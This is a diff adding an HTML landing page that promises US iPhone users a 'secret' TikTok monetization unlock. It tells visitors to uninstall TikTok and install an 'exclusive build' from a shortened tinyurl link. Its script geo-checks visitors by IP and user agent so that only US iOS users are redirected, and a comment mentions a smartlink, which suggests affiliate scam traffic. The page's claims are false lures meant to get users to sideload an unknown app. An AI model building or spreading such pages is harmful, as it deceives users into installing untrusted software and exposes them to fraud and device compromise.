@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>TikTok Monetization Unlock - USA iOS Exclusive</title>
+<meta name="description" content="Unlock TikTok Monetization on your iPhone! USA iOS users only. Follow the steps to activate your Creator Fund today." />
+<meta name="robots" content="index, follow" />
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #121212;
+    color: #fff;
+    margin: 0; padding: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: flex-start;
+    min-height: 100vh;
+  }
+  header {
+    padding: 20px;
+    text-align: center;
+    max-width: 480px;
+  }
+  h1 {
+    font-size: 2rem;
+    margin-bottom: 0.3em;
+    color: #00f2ea;
+  }
+  p {
+    font-size: 1.1rem;
+    line-height: 1.5;
+    margin-bottom: 1.5em;
+    color: #ccc;
+  }
+  button {
+    background: #00f2ea;
+    border: none;
+    color: #000;
+    font-weight: bold;
+    font-size: 1.2rem;
+    padding: 15px 25px;
+    border-radius: 50px;
+    cursor: pointer;
+    box-shadow: 0 0 15px #00f2eaaa;
+    transition: background 0.3s ease;
+    user-select: none;
+  }
+  button:hover {
+    background: #00c6b5;
+  }
+  .warning {
+    margin-top: 2em;
+    font-size: 1rem;
+    color: #f44336;
+  }
+  .hidden {
+    display: none;
+  }
+</style>
+</head>
+<body>
+<header>
+  <h1>TikTok Monetization Unlock</h1>
+  <p><strong>USA iPhone Users Only:</strong> Unlock TikTok's secret monetization feature that lets you earn even if you have under 1,000 followers.</p>
+  <p>Steps to unlock:</p>
+  <ol>
+    <li>Uninstall TikTok from your iPhone.</li>
+    <li>Click the button below to install the exclusive TikTok build.</li>
+    <li>Wait 24 hours and check your Creator Fund tab.</li>
+  </ol>
+  <button id="installBtn">Unlock TikTok Monetization</button>
+  <p class="warning hidden" id="blockMsg">Sorry, this unlock is only available for iPhone users in the USA.</p>
+</header>
+
+<script>
+// Simple geo + device check using free IP-API & userAgent
+
+async function checkGeoDevice() {
+  try {
+    const res = await fetch('https://ipapi.co/json/');
+    const data = await res.json();
+    const country = data.country_code || '';
+    const ua = navigator.userAgent || '';
+    const isIOS = /iPhone|iPad|iPod/i.test(ua);
+    if (country === 'US' && isIOS) {
+      return true;
+    }
+    return false;
+  } catch {
+    return false;
+  }
+}
+
+document.getElementById('installBtn').addEventListener('click', async () => {
+  const allowed = await checkGeoDevice();
+  if (!allowed) {
+    document.getElementById('blockMsg').classList.remove('hidden');
+    return;
+  }
+  // Replace YOUR_SMARTLINK_URL below with your actual SmartLink
+  window.location.href = 'https://tinyurl.com/TikTokIosMod';
+});
+
+// Run on page load and block button if not allowed
+(async () => {
+  const allowed = await checkGeoDevice();
+  if (!allowed) {
+    document.getElementById('installBtn').disabled = true;
+    document.getElementById('blockMsg').classList.remove('hidden');
+  }
+})();
+</script>
+</body>
+</html>
